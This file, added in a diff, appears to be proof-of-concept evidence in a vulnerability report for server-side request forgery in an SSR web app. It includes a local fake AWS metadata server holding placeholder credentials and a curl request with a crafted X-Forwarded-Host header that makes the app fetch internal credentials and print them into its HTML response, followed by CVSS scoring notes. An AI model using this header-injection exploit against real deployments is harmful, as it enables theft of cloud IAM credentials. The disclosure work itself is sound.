@@ -1,0 +1,54 @@
+IMDS-simulated victim run (127.0.0.1:16900) exfiltration evidence
+
+Victim was started with:
+
+  node -e 'const http=require("http");
+    const body=JSON.stringify({
+      Code:"Success",
+      LastUpdated:new Date().toISOString(),
+      Type:"AWS-HMAC",
+      AccessKeyId:"ASIAQ3EXAMPLEIMDS",
+      SecretAccessKey:"wJalrXUtnFEMI/K7MDENG+bPxRfiCYEXAMPLEKEY",
+      Token:"IQoJb3JpZ2luX2VjEFsaCXVzLXdlc3QtMiJHMEUCIQDexampleIMDSTOKEN",
+      Expiration:"2026-04-25T00:00:00Z"
+    });
+    http.createServer((req,res)=>{
+      console.log(`[${new Date().toISOString()}] ${req.method} ${req.url} host=${req.headers.host}`);
+      res.writeHead(200,{"Content-Type":"application/json"});
+      res.end(body);
+    }).listen(16900,"127.0.0.1",()=>console.log("imds victim listening 16900"));'
+
+Exploit request:
+
+  curl -s http://127.0.0.1:5100/ \
+       -H 'Host: localhost:5100' \
+       -H 'X-Forwarded-Host: localhost,@127.0.0.1:16900'
+
+Rendered HTML response from the SSR server included:
+
+  <pre id="result">FETCH=http://127.0.0.1:16900/probe|BODY={
+    "Code":"Success",
+    "LastUpdated":"2026-04-24T09:52:25.456Z",
+    "Type":"AWS-HMAC",
+    "AccessKeyId":"ASIAQ3EXAMPLEIMDS",
+    "SecretAccessKey":"wJalrXUtnFEMI/K7MDENG+bPxRfiCYEXAMPLEKEY",
+    "Token":"IQoJb3JpZ2luX2VjEFsaCXVzLXdlc3QtMiJHMEUCIQDexampleIMDSTOKEN",
+    "Expiration":"2026-04-25T00:00:00Z"
+  }</pre>
+
+IMDS victim log line:
+
+  [2026-04-24T09:52:25.456Z] GET /probe host=127.0.0.1:16900
+
+The SSR rendered the JSON credential document verbatim into the HTML body
+returned to the attacker's curl. The attacker can extract AccessKeyId,
+SecretAccessKey, and Token and use them against the AWS API to assume the
+cloud account's IAM role.
+
+This is the concrete realization of the CVSS C:H justification: the
+disclosed information presents a direct, serious impact, matching the
+CVSS 3.1 §2.3.1 example of "steals the administrator's password".
+
+The target service (169.254.169.254 IMDS) is managed by a different
+security authority (AWS IAM) than the SSR app, which is the basis for the
+Scope Change (S:C) per CVSS v3.1 User Guide §11.
